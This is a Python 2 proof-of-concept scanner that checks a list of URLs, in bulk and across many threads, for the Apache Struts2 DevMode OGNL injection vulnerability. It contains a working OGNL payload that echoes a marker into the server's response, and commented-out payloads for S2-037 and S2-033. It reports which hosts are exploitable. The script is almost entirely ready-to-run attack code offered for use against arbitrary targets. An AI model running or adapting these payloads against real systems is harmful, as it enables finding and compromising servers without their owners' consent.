#coding=utf-8
import requests
import argparse
import threading
import time


url_exploit=[]
mutex=threading.Lock()
ThreadNum=threading.Semaphore(100) #thread num


banner = u'''\
# S2-DevMode POC 批量扫描
# 时间：2016年8月14日
#
'''
def verity(url):
    ThreadNum.acquire()
    global url_exploit
    #s2037_poc = "/%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23wr.println(%23parameters.content[0]),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=s2037_poc"
    #s2033_poc = "/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23parameters.content[0]%2b602%2b53718),%23wr.close(),xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=2908"
    S2_DevMode_POC = "?debug=browser&object=(%23mem=%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f%23context[%23parameters.rpsobj[0]].getWriter().println(%23parameters.content[0]):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=S2_DevMode_POC"
    poc_url=url+S2_DevMode_POC
    content=requests.get(poc_url,timeout=4)
    mutex.acquire()
    if "S2_DevMode_POC" in content.text and content.status_code==200:
        if len(content.text)<40:
            url_exploit.append(url)
            print url
            print "yes"
        else:
            print "no"
    else:
        print "no"
    mutex.release()
    ThreadNum.release()

def main():
    print banner
    fr=open("url","r")
    url=fr.readline()
    while(url):
        url=url[0:-1]
        t=threading.Thread(target=verity,args=(url,))
        t.setDaemon(True)
        t.start()
        url=fr.readline()
    t.join()

    while(threading.activeCount()!=1):
        time.sleep(1)
    fr.close()
    print "---------------------------------------------------------"
    print "{num} urls vulnerable:".format(num=len(url_exploit))
    print url_exploit
    print "---------------------------------------------------------"
    print "over!"

if __name__=="__main__":
    main()
